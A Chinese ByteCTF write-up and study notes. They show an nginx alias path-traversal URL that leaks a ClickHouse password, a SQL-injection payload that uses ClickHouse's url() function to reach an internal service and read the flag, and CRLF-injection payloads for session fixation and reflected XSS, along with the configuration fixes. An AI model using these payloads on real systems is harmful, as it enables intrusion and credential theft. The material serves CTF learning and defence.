第一步：

nginx配置不当导致目录穿越

http://39.105.175.150:30001/files../var/lib/clickhouse/access/

有个sql文件 下载下来后拿到数据库密码


ATTACH USER user_01 IDENTIFIED WITH plaintext_password BY 'e3b0c44298fc1c149afb';

ATTACH GRANT SELECT ON ctf.* TO user_01;

通过其自带内网的http服务登录user_01拿到flag

```php
http://39.105.175.150:30001/?id=1 union all select extractTextFromHTML(html) FROM url('http://127.0.0.1:8123/?user=user_01%26password=e3b0c44298fc1c149afb%26query=select%2520*%2520from%2520ctf.flag',RawBLOB,'html String');--
# ByteCTF{e3b0c44298fc1c149afbf4c8}
```

知识点：

ngnix配置不当导致目录穿越

Nginx在配置别名（Alias）的时候，如果忘记加/，将造成一个目录穿越漏洞。
错误的配置文件示例（原本的目的是为了让用户访问到/home/目录下的文件）：

利用方法：

![](https://img-blog.csdnimg.cn/20181116174450974.png)

穿越上层目录

![](https://img-blog.csdnimg.cn/20181116174455219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2Mzc0ODk2,size_16,color_FFFFFF,t_70)

漏洞修复

![](https://img-blog.csdnimg.cn/20181116174504524.png)

![](https://img-blog.csdnimg.cn/20181116174507397.png)

crlf注入：
-

什么是crlf注入：

回车换行（CRLF）注入攻击是一种当用户将CRLF字符插入到应用中而触发漏洞的攻击技巧。CRLF字符（%0d%0a）在许多互联网协议中表示行的结束，包括HTML，该字符解码后即为\ r\ n。这些字符可以被用来表示换行符，并且当该字符与HTTP协议请求和响应的头部一起联用时就有可能会出现各种各样的漏洞，包括http请求走私（HTTP RequestSmuggling）和http响应拆分（HTTP Response Splitting）。

明天要看的文章：

https://www.cnblogs.com/mysticbinary/p/12560080.html

https://www.cnblogs.com/mysticbinary/p/12560080.html

漏洞原理

```php

Nginx会将$uri进行解码，导致传入%0a%0d即可引入换行符，造成CRLF注入漏洞。

错误的配置文件示例（原本的目的是为了让http的请求跳转到https上）：

location / {
    return 302 https://$host$uri;
}

利用方式

访问 192.168.91.130:8080

正常跳转

![](https://img-blog.csdnimg.cn/20181116173700538.png)

会话固定

payload

http://192.168.91.130:8080/%0ASet-cookie:JSPSESSID%3D360

![](https://img-blog.csdnimg.cn/20181116173708141.png)

返回包

![](https://img-blog.csdnimg.cn/20181116173713712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2Mzc0ODk2,size_16,color_FFFFFF,t_70)

反射性XSS

payload

![](http://192.168.91.130:8080/%0D%0A%0D%0A%3Cimg%20src=1%20onerror=alert(/xss/)%3E)

![](https://img-blog.csdnimg.cn/20181116174035141.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2Mzc0ODk2,size_16,color_FFFFFF,t_70)

为什么没弹窗？

浏览器Filter对XSS特征进行了过滤，并且浏览器进行了跳转如何阻止浏览器跳转，参考链接：

https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html

https://www.leavesongs.com/PENETRATION/Sina-CRLF-Injection.html


漏洞修复
```php
location /{
return 302 https://$host$request_uri
}
```
使用不解码的跳转方式

以上是根据这次字节跳动的ctf比赛而找的一些知识点，看了很多大佬博客，所以我觉得应该挺全了吧算是。
